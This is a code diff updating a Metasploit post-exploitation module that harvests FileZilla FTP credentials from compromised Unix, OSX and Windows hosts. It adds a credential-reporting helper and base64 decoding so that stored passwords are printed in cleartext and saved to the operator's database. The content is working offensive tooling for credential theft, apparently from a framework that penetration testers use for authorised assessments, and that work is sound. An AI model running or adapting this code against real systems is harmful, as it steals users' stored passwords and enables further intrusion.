@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
 
@@ -30,13 +27,14 @@ class Metasploit3 < Msf::Post
   def run
     paths = []
     case session.platform
-    when /unix|linux|bsd/
+    when 'unix', 'linux', 'bsd'
       @platform = :unix
       paths = enum_users_unix
-    when /osx/
+    when 'osx'
       @platform = :osx
       paths = enum_users_unix
-    when /win/
+    when 'windows'
+      @platform = :windows
       profiles = grab_user_profiles()
       profiles.each do |user|
         next if user['AppData'] == nil
@@ -103,6 +101,44 @@ class Metasploit3 < Msf::Post
     return nil
   end
 
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: fullname,
+      post_reference_name: self.refname,
+      session_id: session_db_id,
+      origin_type: :session,
+      private_data: opts[:password],
+      private_type: :password,
+      username: opts[:username]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+  def is_base64?(str)
+    str.match(/^([A-Za-z0-9+\/]{4})*([A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)$/) ? true : false
+  end
+
+
+  def try_decode_password(str)
+    is_base64?(str) ? Rex::Text.decode_base64(str) : str
+  end
+
+
   def get_filezilla_creds(paths)
 
     sitedata = ""
@@ -155,14 +191,14 @@ class Metasploit3 < Msf::Post
           else
             source_id = nil
           end
-          report_auth_info(
-            :host  => loot['host'],
-            :port => loot['port'],
-            :sname => 'ftp',
-            :source_id => source_id,
-            :source_type => "exploit",
-            :user => loot['user'],
-            :pass => loot['password'])
+
+          report_cred(
+            ip: loot['host'],
+            port: loot['port'],
+            service_name: 'ftp',
+            username: loot['user'],
+            password: try_decode_password(loot['password'])
+          )
         end
       end
     end
@@ -214,7 +250,7 @@ class Metasploit3 < Msf::Post
       print_status("    Server: %s:%s" % [account['host'], account['port']])
       print_status("    Protocol: %s" % account['protocol'])
       print_status("    Username: %s" % account['user'])
-      print_status("    Password: %s" % account['password'])
+      print_status("    Password: %s" % try_decode_password(account['password']))
       print_line("")
     end
     return creds
